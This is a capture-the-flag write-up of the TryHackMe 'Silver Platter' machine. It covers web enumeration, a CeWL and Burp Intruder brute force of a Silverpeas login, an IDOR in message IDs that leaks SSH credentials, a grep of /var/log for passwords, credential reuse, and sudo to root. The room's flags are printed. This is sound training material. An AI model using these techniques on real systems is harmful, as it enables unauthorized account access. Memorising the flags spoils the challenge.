# 🥈 TryHackMe — Silver Platter

> **Silverpeas | Authentication Bypass | IDOR | Credential Exposure | Linux Privilege Escalation**

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-55a630?style=flat-square&labelColor=555555)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-00a98f?style=flat-square&labelColor=555555)
![Vulnerability](https://img.shields.io/badge/Vulnerability-Auth%20Bypass%20%7C%20IDOR-f06c2f?style=flat-square&labelColor=555555)
![Service](https://img.shields.io/badge/Service-HTTP%20%7C%20SSH-008cc1?style=flat-square&labelColor=555555)
![OS](https://img.shields.io/badge/OS-Ubuntu-e95420?style=flat-square&labelColor=555555)

---

## 📋 Overview

**Silver Platter** is a TryHackMe Linux machine focused on web application enumeration, Silverpeas vulnerabilities, credential exposure, and Linux privilege escalation.

The machine demonstrates a multi-stage attack chain:

```text
Reconnaissance
      ↓
Web Enumeration
      ↓
Silverpeas Discovery
      ↓
Authentication Bypass
      ↓
Broken Access Control / IDOR
      ↓
Credential Disclosure
      ↓
SSH Access
      ↓
Log Enumeration
      ↓
Credential Reuse
      ↓
Privilege Escalation
      ↓
     Root

```



## 🎯 Objectives
- Enumerate the target system.
- Identify exposed services.
- Discover the Silverpeas application.
- Exploit the authentication mechanism.
- Abuse broken access control in Silverpeas.
- Obtain valid SSH credentials.
- Gain access as **tim**.
- Enumerate the Linux system.
- Identify credentials exposed in logs.
- Switch to **tyler**.
- Escalate privileges to **root**.
- Capture the user and root flags.

---

## 🔎 1. Reconnaissance

I started with an Nmap service/version scan:
```
nmap -sV 10.49.136.131
```
**Results**
```
22/tcp    open    ssh         OpenSSH 8.9p1 Ubuntu
80/tcp    open    http        nginx 1.18.0
8080/tcp  open    http-proxy
```

<img width="1168" height="633" alt="1" src="https://github.com/user-attachments/assets/5d5d3971-13b3-4b91-876e-e270c0ae0617" />


The target was running Ubuntu and exposed two HTTP services along with SSH.

**Attack Surface**
```
22/tcp   → SSH
80/tcp   → Web application
8080/tcp → Web application / Silverpeas
```
---

## 🌐 2. Web Enumeration

I visited the website running on port 80:
```
http://10.49.136.131
```
The website was titled:
```
Hack Smarter Security
```
The public website contained a **Contact** section.

<img width="1089" height="712" alt="2" src="https://github.com/user-attachments/assets/d933d623-70c8-4e68-b5e9-46109fc0c02f" />

---

## 👤 3. Information Disclosure

The Contact page revealed information about the organization's project manager.

It specifically mentioned:
```
Silverpeas
```
and disclosed the username:
```
scr1ptkiddy
```

<img width="1037" height="615" alt="2-1" src="https://github.com/user-attachments/assets/b635b50a-5cbb-430a-af24-212cd476c469" />

**Why this was important**

This gave us two useful pieces of information:
```
Application → Silverpeas
Username    → scr1ptkiddy
```
This demonstrates why manual web enumeration is important. Public-facing pages can disclose usernames and information about the technologies used by an organization.

---

## 📂 4. Directory Enumeration

I performed directory enumeration against the web server:
```
gobuster dir -u http://10.49.136.131 -w /usr/share/wordlists/dirb/common.txt
```
The scan discovered:
```
/assets       → 301
/images       → 301
/index.html   → 200
```

<img width="823" height="374" alt="3" src="https://github.com/user-attachments/assets/b97bd4f0-962c-4faa-a77e-ec3308e9a7d4" />

Nothing immediately useful was discovered on port 80, so I moved my attention to port **8080**.

---

## 🔎 5. Discovering Silverpeas

The information from the Contact page indicated that the organization used Silverpeas.

I investigated the service running on port **8080** and found the Silverpeas application under:
```
http://10.49.136.131:8080/silverpeas/
```
The application presented a Silverpeas login page.

<img width="1044" height="600" alt="4" src="https://github.com/user-attachments/assets/b323e605-fbe2-4d5e-b74f-55180d80d266" />

This confirmed that the application mentioned on the public website was actually running on the target.

---

# 🔐 6. Silverpeas Authentication

After discovering the Silverpeas login page, I investigated the authentication mechanism using **Burp Suite**.

The login request was sent to:

```text
/silverpeas/AuthenticationServlet
```
The request contained:
```
Login=scr1ptkiddy
Password=...
DomainId=0
```
The username scr1ptkiddy had already been discovered from the public Contact page.

---

## 📖 7. Creating a Custom Password Wordlist

Instead of using a generic password wordlist, I created a custom wordlist from the target's public website using CeWL.
```
cewl http://10.49.136.131 > pass.txt
```
This crawls the website and extracts words that appear on the target's publicly accessible pages.

The resulting wordlist was saved as:
```
pass.txt
```
**Why use CeWL?**

A custom wordlist can be more effective than a generic wordlist when passwords are based on information related to an organization, website, employees, projects, or other publicly available content.

The process was:
```
Target Website
      ↓
      CeWL
      ↓
   pass.txt
      ↓
Burp Intruder
```

---

## 🔨 8. Brute-Forcing the Silverpeas Password

I then used **Burp Suite Intruder** to test the generated password wordlist against the Silverpeas login.

The login request was configured with:
```
Login=scr1ptkiddy
Password=§payload§
DomainId=0
```
The password parameter was selected as the Intruder payload position.

The generated wordlist was loaded into Burp Intruder as a **Simple List**.

The Intruder configuration showed:
```
Payload type: Simple list
Payload count: 344
```
The attack then tested the passwords from **pass.txt** against the known username.

<img width="1203" height="584" alt="5" src="https://github.com/user-attachments/assets/b5d50fb8-f711-4cc4-b6eb-4a23aa0ffa7b" />

---

## 🔑 9. Identifying the Valid Password

Burp Intruder tested the candidate passwords against:

```text
Username: scr1ptkiddy
```

The results could then be compared based on differences in the server responses.

<img width="1179" height="587" alt="6" src="https://github.com/user-attachments/assets/8c533437-f41d-4c3a-8427-eeedcfd0a57e" />


The successful credential was then used to authenticate to Silverpeas.

### Important Note

The authentication method used in this machine was:
```text
CeWL
  ↓
Custom Wordlist
  ↓
Burp Intruder
  ↓
Password Brute Force
```

I did **not** use the Silverpeas password-field omission technique.

---


## 📬 10. Enumerating Silverpeas Notifications

After successfully authenticating to Silverpeas, I explored the notification functionality.

Silverpeas provided access to user notifications/messages.

The application used a message identifier:

```text
ReadMessage.jsp?ID=
```

For example:

```text
/silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=5
```

<img width="984" height="485" alt="8" src="https://github.com/user-attachments/assets/5aaa9f06-8605-4d32-9f79-afe80fbd10e1" />


The use of a predictable numeric ID suggested that access control should be tested.

---

## 🔓 11. IDOR

I investigated whether changing the message ID would allow access to messages belonging to other users.

The vulnerable functionality followed this pattern:

```text
ReadMessage.jsp?ID=<message_id>
```

The important security question was:

```text
Does the server verify that the current user owns or is authorized to read the requested message?
```

By enumerating message IDs, I was able to access messages that were not intended for the current user.

<img width="1014" height="439" alt="9" src="https://github.com/user-attachments/assets/af51da53-6adf-4ca8-8570-a4101608ae42" />

This is an example of:

```text
Insecure Direct Object Reference (IDOR)
```

---

## 📩 12. Finding the SSH Credentials

During the notification enumeration, I discovered an SSH-related message.

The message exposed credentials for:

```text
Username: tim
Password: [REDACTED]
```

This was a critical finding because credentials exposed through the web application could be used against the underlying Linux host.

The attack chain was now:

```text
Silverpeas
    ↓
Notification Enumeration
    ↓
IDOR
    ↓
Credential Disclosure
    ↓
SSH Credentials
```

---

## 💻 13. SSH Access as `tim`

I used the recovered credentials to connect to the target through SSH:

```bash
ssh tim@10.49.136.131
```

The connection was successful.

The system identified itself as:

```text
Ubuntu 22.04.3 LTS
GNU/Linux 5.15.0-91-generic
x86_64
```

<img width="919" height="407" alt="10" src="https://github.com/user-attachments/assets/83b392f2-d2e0-4ce2-b8c1-e43c2ffc23f5" />

I now had an interactive shell as:

```text
tim
```

---

## 🚩 14. Capturing the User Flag

I checked the contents of the user's home directory:

```bash
ls
```

The directory contained:

```text
user.txt
```

I retrieved the flag using:

```bash
cat user.txt
```

### User Flag

```text
THM{cf4ca438a0b923820dcc509a6f75849b}
```

<img width="648" height="123" alt="11" src="https://github.com/user-attachments/assets/317f4459-2ff8-4d5c-ae70-50d98fed3e24" />

---

## 🔍 15. Checking Sudo Permissions

After obtaining the user flag, I started privilege-escalation enumeration.

I checked the sudo permissions for `tim`:

```bash
sudo -l
```

The result showed:

```text
Sorry, user tim may not run sudo on ip-10-49-136-131.
```

Therefore, there was no direct sudo privilege escalation available from `tim`.

I needed to continue enumerating the system.

---

## 👥 16. Enumerating Local Users

I inspected `/etc/passwd`:

```bash
cat /etc/passwd
```

This revealed multiple local accounts.

The relevant interactive users included:

```text
tyler
tim
root
```

The `tyler` account had an interactive Bash shell:

```text
tyler:x:1000:1000:...:/home/tyler:/bin/bash
```

<img width="739" height="695" alt="12" src="https://github.com/user-attachments/assets/faa7c22e-b8e0-468b-badf-66473439e546" />

This suggested that another local account could potentially provide a path to privilege escalation.

---

## 📜 17. Enumerating `/var/log`

Since `tim` did not have sudo privileges, I started investigating other sources of sensitive information.

I moved into the log directory:

```bash
cd /var/log
```

and listed the available logs:

```bash
ls
```

Important files included:

```text
auth.log
auth.log.1
auth.log.2
syslog
syslog.1
...
```

<img width="1211" height="224" alt="13" src="https://github.com/user-attachments/assets/323bdb05-4dcf-4bf1-aee9-ab8609ed7237" />

---

## 🔎 18. Searching Logs for Passwords

I searched the logs for password-related information:

```bash
grep -iR 'password' /var/log
```

The search produced interesting entries.

One of the authentication logs contained information related to the Silverpeas Docker deployment, including database-related environment variables:

```text
DB_NAME=Silverpeas
DB_USER=silverpeas
DB_PASSWORD=...
```

The logs also contained authentication events involving the `tyler` account.

<img width="1001" height="215" alt="14" src="https://github.com/user-attachments/assets/809eae37-d3fe-416a-aac6-955379cc849b" />

### Security Issue

This demonstrated a serious credential-management problem.

Sensitive information had been exposed through system logs.

If an attacker can read those logs, credentials accidentally written to them may become recoverable.

---

## 🔑 19. Credential Reuse

The recovered credential was then tested against the local `tyler` account.

I attempted:

```bash
su tyler
```

After entering the recovered password, the shell changed to:

```text
tyler@ip-10-49-136-131
```

This demonstrated **password reuse**.

The same credential that was exposed through the system/application environment was also valid for another Linux account.

---

## 👑 20. Privilege Escalation

Now operating as `tyler`, I attempted to access the root directory:

```bash
cd /root
```

The result was:

```text
bash: cd: /root: Permission denied
```

This confirmed that `tyler` was not yet root.

I then used the available sudo privileges:

```bash
sudo su
```

The shell changed to:

```text
root@ip-10-49-136-131
```

At this point, full root-level access had been obtained.

---

## 🚩 21. Capturing the Root Flag

I navigated to the root user's home directory:

```bash
cd /root
```

Then:

```bash
ls
```

The directory contained:

```text
root.txt
snap
start_docker_containers.sh
```

I retrieved the flag:

```bash
cat root.txt
```

### Root Flag

```text
THM{098f6bcd4621d373cade4e832627b4f6}
```

<img width="1195" height="328" alt="15" src="https://github.com/user-attachments/assets/e769ff7d-d946-429d-a9f1-28839d5c5c19" />

---
